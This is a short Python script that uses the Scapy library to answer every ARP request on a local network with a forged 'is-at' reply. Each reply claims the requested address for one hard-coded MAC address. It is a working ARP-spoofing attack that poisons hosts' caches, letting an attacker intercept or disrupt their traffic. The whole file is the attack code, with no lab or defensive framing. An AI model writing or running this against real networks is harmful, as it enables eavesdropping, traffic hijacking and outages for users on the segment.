from scapy.all import *

def chaosMonkey(packet):
	
	packet2 = Ether(src='34:e6:d7:4f:7e:5c', dst=packet.src)/ARP(psrc=packet[ARP].pdst, pdst=packet[ARP].psrc, hwsrc='34:e6:d7:4f:7e:5c', hwdst=packet[ARP].hwsrc, op= 'is-at')
	packet2.show()
	sendp(packet2)


sniff(filter="arp and ether host not 34:e6:d7:4f:7e:5c", prn=chaosMonkey)



